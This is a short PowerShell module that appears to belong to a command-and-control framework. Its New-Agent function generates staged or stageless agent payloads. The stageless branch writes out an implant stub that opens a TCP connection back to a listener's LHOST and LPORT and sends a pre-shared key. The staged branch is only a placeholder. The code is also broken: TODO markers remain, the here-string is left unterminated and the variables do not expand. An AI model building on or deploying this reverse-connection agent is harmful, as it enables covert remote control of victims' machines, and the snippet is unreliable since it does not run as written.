#
# New_Agent.psm1
#
Function Global:New-Agent()
{
    [CmdletBinding()]
    param
    (
		[Parameter()]
		[String]$Listerner,

		[Parameter()]
		[ValidateSet("Staged","Stageless")]
		[String]$StageType


    )


	Process
	{
		
		if($StageType -eq "Staged")
		{
			"Oneliner here"
		}

		if($StageType -eq "Stageless")
		{
				$PSK = ($Listerner.PSK)

				$Agent = @'
					TODO:::::
					$PSK = $PSK
					$tcp = New-Object System.Net.Sockets.TcpClient; 
					$tcp.connect('$Listerner.LHOST', $Listerner.LPORT); 

					$tcpStream = $tcp.GetStream()
					$reader = New-Object System.IO.StreamReader($tcpStream)
					$writer = New-Object System.IO.StreamWriter($tcpStream)
					$writer.WriteLine($PSK);
					$reader.ReadLine()
			'
			

			
		}
		
	}
		

 }	